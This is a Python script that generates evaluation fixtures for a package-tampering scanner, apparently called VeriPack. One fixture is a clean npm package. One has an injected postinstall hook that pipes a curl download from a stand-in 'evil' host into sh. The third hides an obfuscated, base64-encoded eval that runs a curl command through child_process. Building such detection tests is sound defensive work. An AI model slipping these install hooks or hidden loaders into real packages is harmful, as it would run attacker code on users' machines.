"""Generates the 3 official Problem 04 evaluation fixtures and real VeriPack JSON reports."""
import json
import subprocess
import sys
import tarfile
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent


def make_npm_tgz(files: dict[str, str], out_tgz: Path) -> None:
    out_tgz.parent.mkdir(parents=True, exist_ok=True)
    with tempfile.TemporaryDirectory() as tmp:
        pkg_root = Path(tmp) / "package"
        pkg_root.mkdir(parents=True, exist_ok=True)
        for rel_path, content in files.items():
            target = pkg_root / rel_path
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(content, encoding="utf-8")
        with tarfile.open(out_tgz, "w:gz") as tar:
            tar.add(pkg_root, arcname="package")


def write_source_dir(files: dict[str, str], src_dir: Path) -> None:
    src_dir.mkdir(parents=True, exist_ok=True)
    for rel_path, content in files.items():
        target = src_dir / rel_path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, encoding="utf-8")


def build_all() -> None:
    # 1. Archetype 1: clean_pkg (SAFE - src/index.ts compiled to dist/index.js)
    clean_src = {
        "package.json": json.dumps({
            "name": "clean_pkg",
            "version": "1.0.0",
            "main": "dist/index.js",
            "scripts": {"build": "tsc"}
        }, indent=2),
        "src/index.ts": "export function add(a: number, b: number): number {\n  return a + b;\n}\n",
        "tests/index.test.ts": "import { add } from '../src/index';\n",
        "README.md": "# clean_pkg\n",
    }
    clean_archive = {
        "package.json": json.dumps({
            "name": "clean_pkg",
            "version": "1.0.0",
            "main": "dist/index.js",
            "scripts": {"build": "tsc"}
        }, indent=2),
        "dist/index.js": "\"use strict\";\nexport function add(a, b) {\n  return a + b;\n}\n",
        "README.md": "# clean_pkg\n",
    }
    write_source_dir(clean_src, ROOT / "clean_pkg" / "source")
    make_npm_tgz(clean_archive, ROOT / "clean_pkg" / "clean_pkg-1.0.0.tgz")

    # 2. Archetype 2: tampered_manifest (TAMPERED - injected postinstall lifecycle hook)
    tampered_src = {
        "package.json": json.dumps({
            "name": "tampered_manifest",
            "version": "1.0.0",
            "main": "index.js",
            "scripts": {"test": "echo ok"}
        }, indent=2),
        "index.js": "module.exports = { hello: () => 'world' };\n",
    }
    tampered_archive = {
        "package.json": json.dumps({
            "name": "tampered_manifest",
            "version": "1.0.0",
            "main": "index.js",
            "scripts": {
                "test": "echo ok",
                "postinstall": "curl -s https://evil.example.invalid/exfil.sh | sh"
            }
        }, indent=2),
        "index.js": "module.exports = { hello: () => 'world' };\n",
    }
    write_source_dir(tampered_src, ROOT / "tampered_manifest" / "source")
    make_npm_tgz(tampered_archive, ROOT / "tampered_manifest" / "tampered_manifest-1.0.0.tgz")

    # 3. Archetype 3: ghost_backdoor (COMPROMISED - unmapped obfuscated lib/x.min.js payload)
    ghost_src = {
        "package.json": json.dumps({
            "name": "ghost_backdoor",
            "version": "1.0.0",
            "main": "index.js"
        }, indent=2),
        "index.js": "module.exports = { version: '1.0.0' };\n",
    }
    ghost_archive = {
        "package.json": json.dumps({
            "name": "ghost_backdoor",
            "version": "1.0.0",
            "main": "index.js"
        }, indent=2),
        "index.js": "module.exports = { version: '1.0.0' };\n",
        "lib/x.min.js": (
            "var _0x4f2a=['\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73',"
            "'\\x65\\x78\\x65\\x63'];"
            "eval(Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgaHR0cHM6Ly9ldmlsLmV4YW1wbGUuaW52YWxpZCcp','base64').toString());"
        ),
    }
    write_source_dir(ghost_src, ROOT / "ghost_backdoor" / "source")
    make_npm_tgz(ghost_archive, ROOT / "ghost_backdoor" / "ghost_backdoor-1.0.0.tgz")

    # Run VeriPack CLI on each fixture to record real actual_output.json
    for name in ("clean_pkg", "tampered_manifest", "ghost_backdoor"):
        archive_p = ROOT / name / f"{name}-1.0.0.tgz"
        source_p = ROOT / name / "source"
        out_json = ROOT / name / "actual_output.json"
        subprocess.run(
            [
                sys.executable, "-m", "veripack", "analyze",
                "--archive", str(archive_p),
                "--repo", str(source_p),
                "--no-llm",
                "--json",
                "--output", str(out_json),
            ],
            check=False,
        )


if __name__ == "__main__":
    build_all()
